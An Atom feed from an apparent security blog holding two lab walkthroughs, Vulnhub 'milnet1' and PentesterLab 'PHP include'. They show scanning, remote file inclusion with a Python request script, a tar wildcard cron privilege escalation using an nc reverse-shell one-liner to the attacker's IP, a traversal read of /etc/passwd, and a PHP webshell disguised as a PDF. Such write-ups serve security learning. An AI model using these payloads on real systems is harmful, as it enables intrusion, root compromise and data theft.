<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: lfi | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/lfi/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-08-16T16:04:53-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[milnet1]]></title>
    <link href="http://wg135.github.io/blog/2016/07/28/milnet1/"/>
    <updated>2016-07-28T14:47:38-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/28/milnet1</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Tamper Data</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/milnet1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.154 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.154 -p-</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22 and 80 are opening</p>

<p>use nmap to run http-enum script:</p>

<p><code>nmap 192.168.41.154 -p80 --script http-enum</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>The info.php file exists.</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.154</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.154/FUZZ 2&gt;/dev/null</code></p>

<p>nothing cool.</p>

<p>I use Tamper Data to exam the GET/POST request parameters.</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting parameter. setup a netcat listerner, and change the parameter value to <code>http://192.168.41.149/reverse?</code></p>

<p>(Here, at first I used reverse.php which created a local reverse shell back to my Kali. I guess there is a filter in target can filter php file, so I just remove .php)</p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>In order to make the process easier, I create a short script <a href="https://github.com/wg135/script/blob/master/send_post.py">send_post.py</a>:</p>

<pre><code class="python send_post.py">#!/usr/bin/env python
#send post requst to the target

import requests
import json

url= 'http://192.168.41.154/content.php'

headers = {
    "Host" : "192.168.41.154",
    "User-Agent" : "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language" : "en-US,en;q=0.5",
    "Accept-Encoding" : "gzip, deflate",
    "Referer" : "http://192.168.41.154/nav.php",
    "Connection" : "keep-alive",
    "Content-Type" : "application/x-www-form-urlencoded",
    "Content-Length" : "40"
}

payload = {
    "route" : "http://192.168.41.149/reverse?"
}


r = requests.post(url, headers=headers, data=payload)
print (r.status_code)
</code></pre>

<p>Next enumeration, no luck on kernerl exploit, check contab job.</p>

<p><code>cat /etc/cron*</code></p>

<p>got <code>/etc/crontab</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>read that file</p>

<p><code>cat /etc/crontab</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>found an interesting file: <code>/backup/backup.sh</code></p>

<p>check that file</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>it uses tar. Searched exploits, no luck.</p>

<p>Under path <code>/home/langman/SDINET</code>, I found a file <code>DefenseCode_Unix_WildCards_Gone_Wild.txt</code> shows tar cdode execution,</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>in kali:</p>

<p><code>nc -nlvp 443</code></p>

<p>in target:</p>

<pre><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.41.149 443 &gt; /tmp/f" &gt; shell.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
$ touch "/var/www/html/--checkpoint=1"
</code></pre>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pentesterlab-PHP-include]]></title>
    <link href="http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include/"/>
    <updated>2016-06-14T12:52:00-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Wfuzz</li>
<li>Netcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.188 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>Use Wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.188/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.79.188</code></p>

<p>looks like there is a php include vulnerability</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets confirm it:</p>

<p><code>http://192.168.79.188/index.php?page=fgfgfgf</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><code>http://192.168.79.188/index.php?page=../../../../../../../../../../etc/passwd%00</code></p>

<p>(the reason why add %00 after /etc/passwd is php code will ad a suffix .php, so that we have to add a Null byte to get rid of it)</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>I tried to exploit remote file inclide:</p>

<p><code>http://192.168.79.188/index.php?page=http://192.168.79.173/webshell.txt&amp;cmd=ifconfig</code></p>

<p>Doesn&rsquo;t work.</p>

<p>Exam the webpage, I find that I can upload pdf file to the server. I tried just rename webshell.txt to webshell.pdf and the server doesn&rsquo;t accpet it. I guess the server will valid the pdf file format. So I create a craft pdf file:</p>

<pre><code class="php webshell.pdf">%PDF-1.4
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></pre>

<p>Upload it. Works.</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now try to visit after log in.</p>

<p>Try to verify the webshell:</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>looks good</p>

<p>set up netcat listener on my kali and run the command on server:</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>and get the shell:</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
</feed>
